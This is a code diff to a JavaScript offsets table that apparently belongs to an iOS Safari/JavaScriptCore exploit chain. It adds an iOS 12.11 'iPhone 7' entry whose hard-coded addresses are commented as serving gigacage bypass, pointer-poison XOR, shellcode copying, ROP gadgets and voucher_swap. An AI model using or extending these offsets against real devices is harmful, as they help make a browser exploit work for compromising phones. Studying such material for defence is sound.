@@ -4,6 +4,8 @@ var offsets = new Array();
 
 offsets[12.01] = new Array();
 
+offsets[12.11] = new Array();
+
 offsets[12.01]["iPhone XR"] ={
 	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
     vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
@@ -362,6 +364,34 @@ offsets[12.01]["iPhone 5S"] ={
     modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
     coreaudio_popx2: MISSING_OFFSET,
     jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
+    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
+    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
+    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
+    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
+    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
+};
+
+offsets[12.11]["iPhone 7"] ={
+	nativejitcode: 0x1888bd210, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
+    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
+    dlopen: 0x180921bd8, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
+    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
+    disableprimitivegigacage: 0x188211ba0, 			// From JavaScriptCore 
+    g_gigacagebaseptrs: 0x1b8c58000, 				// From JavaScriptCore 
+  	g_jsarraybufferpoison: 0x1b8c5c1a0, 			// From JavaScriptCore (For XOR with leaked buffer)
+  	g_jitcodepoison: 0x1b8c5c190, 					// From JavaScriptCore (For XOR with leaked code)
+    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
+    startfixedmempool: 0x1bad790c0, 				// From JavaScriptCore (For copying shellcode)
+    endfixedmempool: 0x1bad790c8, 					// From JavaScriptCore (For copying shellcode)
+    jit_writeseperateheaps_func: 0x1bad790d0,		// From JavaScriptCore (For detecting below i8)
+    usefastpermissions_jitcopy: 0x1b8c5c018,		// From JavaScriptCore (For detecting i8 and up)
+    ptr_stack_check_guard: 0x1b2396f28,				// To make our JITMemCpy work
+    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
+    longjmp: MISSING_OFFSET,					
+    callbacks: MISSING_OFFSET,
+    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
+    coreaudio_popx2: MISSING_OFFSET,
+    jscbase: 0x1881b9000,							// _TEXT segment of JavaScriptCore
     linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
     dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
     thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
